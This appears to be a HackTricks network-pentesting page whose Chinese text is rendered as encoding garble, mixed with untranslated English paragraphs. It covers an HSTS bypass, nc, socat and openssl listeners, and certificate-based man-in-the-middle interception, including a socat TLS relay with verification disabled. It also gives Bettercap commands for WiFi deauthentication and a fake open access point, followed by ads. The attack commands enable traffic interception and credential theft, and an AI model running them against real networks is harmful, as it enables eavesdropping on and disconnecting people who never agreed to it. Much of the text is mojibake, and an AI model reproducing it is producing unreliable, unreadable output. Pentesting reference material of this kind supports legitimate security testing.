è¿™ç§æŠ€æœ¯çš„**ç›®æ ‡**æ˜¯**é¿å…HSTS**ï¼Œå› ä¸º_**wwww**.facebook.com_ **ä¸ä¼š**ä¿å­˜åœ¨æµè§ˆå™¨çš„ç¼“å­˜ä¸­ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¼šè¢«æ¬ºéª—ä»¥ä½¿ç”¨HTTPè¿›è¡Œ**Facebookèº«ä»½éªŒè¯**ã€‚\
è¯·æ³¨æ„ï¼Œä¸ºäº†æ‰§è¡Œæ­¤æ”»å‡»ï¼Œå—å®³è€…å¿…é¡»é¦–å…ˆå°è¯•è®¿é—®[http://www.faceook.com](http://www.faceook.com)ï¼Œè€Œä¸æ˜¯httpsã€‚è¿™å¯ä»¥é€šè¿‡ä¿®æ”¹httpé¡µé¢ä¸­çš„é“¾æ¥æ¥å®Œæˆã€‚

æ›´å¤šä¿¡æ¯[åœ¨è¿™é‡Œ](https://www.bettercap.org/legacy/#hsts-bypass)ï¼Œ[åœ¨è¿™é‡Œ](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014)å’Œ[åœ¨è¿™é‡Œ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)ã€‚

**sslStripæˆ–sslStrip+ä¸å†èµ·ä½œç”¨ã€‚è¿™æ˜¯å› ä¸ºæµè§ˆå™¨ä¸­é¢„å…ˆä¿å­˜äº†HSTSè§„åˆ™ï¼Œæ‰€ä»¥å³ä½¿ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®ä¸€ä¸ªâ€œé‡è¦â€åŸŸï¼Œä»–ä¹Ÿä¼šé€šè¿‡HTTPSè®¿é—®å®ƒã€‚æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œé¢„å…ˆä¿å­˜çš„è§„åˆ™å’Œå…¶ä»–ç”Ÿæˆçš„è§„åˆ™å¯ä»¥ä½¿ç”¨æ ‡å¿—** [**`includeSubdomains`**](https://hstspreload.appspot.com) **ï¼Œå› æ­¤ä¹‹å‰çš„** _**wwww.facebook.com**_ **ç¤ºä¾‹å°†ä¸å†èµ·ä½œç”¨ï¼Œå› ä¸º** _**facebook.com**_ **ä½¿ç”¨å¸¦æœ‰`includeSubdomains`çš„HSTSã€‚**

å¾…åŠäº‹é¡¹ï¼šeasy-credsï¼Œevilgradeï¼Œmetasploitï¼Œfactory

## åœ¨ç«¯å£ä¸Šè¿›è¡ŒTCPç›‘å¬
```
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## åœ¨ç«¯å£ä¸Šç›‘å¬ TCP + SSL

#### ç”Ÿæˆå¯†é’¥å’Œè‡ªç­¾åè¯ä¹¦

```bash
openssl genrsa -out private.key 2048
openssl req -new -x509 -sha256 -key private.key -out certificate.crt -days 365
```

#### å¯åŠ¨ç›‘å¬å™¨

```bash
openssl s_server -key private.key -cert certificate.crt -accept <port>
```

#### ä½¿ç”¨è¯ä¹¦éªŒè¯è¿æ¥

```bash
openssl s_client -connect <host>:<port> -CAfile certificate.crt
```

#### ä½¿ç”¨ nc è¿æ¥åˆ°ç›‘å¬å™¨

```bash
nc -v <host> <port>
```

#### ä½¿ç”¨ curl è¿æ¥åˆ°ç›‘å¬å™¨

```bash
curl --cacert certificate.crt https://<host>:<port>
```
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬

To perform a man-in-the-middle attack and intercept network traffic, you can use a valid SSL/TLS certificate. By generating a certificate that matches the target domain, you can establish a secure connection with the client and then forward the traffic to the actual server. This allows you to eavesdrop on the communication without raising suspicion.

Here are the steps to listen using a certificate:

1. Obtain the target domain's SSL/TLS certificate: You can use tools like `openssl` or online services to retrieve the certificate.

2. Generate a certificate: Using the obtained certificate, generate a new certificate that matches the target domain. This can be done using tools like `openssl` or libraries like `pyOpenSSL`.

3. Set up a proxy: Configure a proxy server, such as Burp Suite or mitmproxy, to intercept the traffic between the client and the server.

4. Install the generated certificate: Import the generated certificate into the client's trust store. This will allow the client to establish a secure connection with the proxy server.

5. Forward traffic: Once the client establishes a connection with the proxy server, forward the traffic to the actual server. This can be done automatically by the proxy server.

By using a valid SSL/TLS certificate, you can effectively listen to network traffic without raising suspicion. However, it is important to note that this technique should only be used for ethical purposes, such as penetration testing or network security assessments.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### ä½¿ç”¨è¯ä¹¦è¿›è¡Œç›‘å¬å¹¶é‡å®šå‘åˆ°ä¸»æœº

To listen using a certificate and redirect to the hosts, you can follow these steps:

1. Generate a self-signed certificate or obtain a valid certificate from a trusted Certificate Authority (CA).

2. Configure the web server to use the certificate for SSL/TLS encryption.

3. Set up the appropriate DNS records to redirect the desired hosts to your listening server's IP address.

4. Modify the hosts file on your local machine or the target machine to redirect the desired hosts to your listening server's IP address.

5. Start the listening server and ensure that it is properly configured to handle incoming SSL/TLS connections.

6. When a client connects to one of the redirected hosts, the SSL/TLS handshake will occur using the certificate. The client will establish a secure connection with your listening server.

7. You can then intercept and analyze the traffic between the client and the redirected host.

By using a certificate to listen and redirect traffic, you can effectively perform man-in-the-middle attacks and gain access to sensitive information exchanged between the client and the redirected host.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
æœ‰æ—¶ï¼Œå¦‚æœå®¢æˆ·ç«¯æ£€æŸ¥CAæ˜¯å¦æœ‰æ•ˆï¼Œä½ å¯ä»¥**æä¾›ç”±CAç­¾åçš„å…¶ä»–ä¸»æœºåçš„è¯ä¹¦**ã€‚\
å¦ä¸€ä¸ªæœ‰è¶£çš„æµ‹è¯•æ˜¯æä¾›**è¯·æ±‚çš„ä¸»æœºåçš„è‡ªç­¾åè¯ä¹¦**ã€‚

å…¶ä»–è¦æµ‹è¯•çš„å†…å®¹åŒ…æ‹¬å°è¯•ä½¿ç”¨æœ‰æ•ˆè¯ä¹¦ç­¾åï¼Œä½†è¯¥è¯ä¹¦ä¸æ˜¯æœ‰æ•ˆçš„CAã€‚æˆ–è€…ä½¿ç”¨æœ‰æ•ˆçš„å…¬é’¥ï¼Œå¼ºåˆ¶ä½¿ç”¨è¯¸å¦‚Diffie-Hellmanä¹‹ç±»çš„ç®—æ³•ï¼ˆä¸éœ€è¦ä½¿ç”¨çœŸå®ç§é’¥è§£å¯†ä»»ä½•å†…å®¹ï¼‰ï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚çœŸå®ç§é’¥çš„æ¢æµ‹ï¼ˆå¦‚å“ˆå¸Œï¼‰æ—¶ï¼Œå‘é€ä¸€ä¸ªä¼ªé€ çš„æ¢æµ‹ï¼Œå¹¶æœŸæœ›å®¢æˆ·ç«¯ä¸ä¼šæ£€æŸ¥è¿™ä¸€ç‚¹ã€‚

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### ä¸»åŠ¨å‘ç°ç¬”è®°

è¯·æ³¨æ„ï¼Œå½“å‘ä¸€ä¸ªæ²¡æœ‰è¯·æ±‚çš„ç«¯å£å‘é€UDPæ•°æ®åŒ…æ—¶ï¼Œä¼šå‘é€ä¸€ä¸ªICMPï¼ˆç«¯å£ä¸å¯è¾¾ï¼‰ã€‚

### **ARPå‘ç°**

ARPæ•°æ®åŒ…ç”¨äºå‘ç°ç½‘ç»œä¸­æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€ã€‚PCå¿…é¡»å¯¹æ¯ä¸ªå¯èƒ½çš„IPåœ°å€å‘é€è¯·æ±‚ï¼Œåªæœ‰æ­£åœ¨ä½¿ç”¨çš„IPåœ°å€æ‰ä¼šå“åº”ã€‚

### **mDNSï¼ˆå¤šæ’­DNSï¼‰**

Bettercapå‘é€ä¸€ä¸ªMDNSè¯·æ±‚ï¼ˆæ¯Xæ¯«ç§’ä¸€æ¬¡ï¼‰ï¼Œè¯·æ±‚çš„å†…å®¹æ˜¯ **\_services\_.dns-sd.\_udp.local**ï¼Œèƒ½çœ‹åˆ°è¿™ä¸ªæ•°æ®åŒ…çš„æœºå™¨é€šå¸¸ä¼šå›åº”è¿™ä¸ªè¯·æ±‚ã€‚ç„¶åï¼Œå®ƒåªæœç´¢å›åº”â€œservicesâ€çš„æœºå™¨ã€‚

**å·¥å…·**

* Avahi-browserï¼ˆ--allï¼‰
* Bettercapï¼ˆnet.probe.mdnsï¼‰
* Responder

### **NBNSï¼ˆNetBiosåç§°æœåŠ¡å™¨ï¼‰**

Bettercapå¹¿æ’­æ•°æ®åŒ…åˆ°ç«¯å£137/UDPï¼Œè¯·æ±‚åç§°ä¸ºâ€œCKAAAAAAAAAAAAAAAAAAAAAAAAAAAâ€ã€‚

### **SSDPï¼ˆç®€å•æœåŠ¡å‘ç°åè®®ï¼‰**

Bettercapå¹¿æ’­SSDPæ•°æ®åŒ…ï¼Œæœç´¢å„ç§æœåŠ¡ï¼ˆUDPç«¯å£1900ï¼‰ã€‚

### **WSDï¼ˆWebæœåŠ¡å‘ç°ï¼‰**

Bettercapå¹¿æ’­WSDæ•°æ®åŒ…ï¼Œæœç´¢æœåŠ¡ï¼ˆUDPç«¯å£3702ï¼‰ã€‚

## å‚è€ƒèµ„æ–™

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bugèµé‡‘æç¤º**ï¼š**æ³¨å†Œ**Intigritiï¼Œä¸€ä¸ªç”±é»‘å®¢åˆ›å»ºçš„é«˜çº§**Bugèµé‡‘å¹³å°**ï¼ç«‹å³åŠ å…¥æˆ‘ä»¬çš„[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ï¼Œå¼€å§‹èµšå–é«˜è¾¾**$100,000**çš„èµé‡‘ï¼

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…æƒ³è¦**è·å–æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)â€”â€”[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
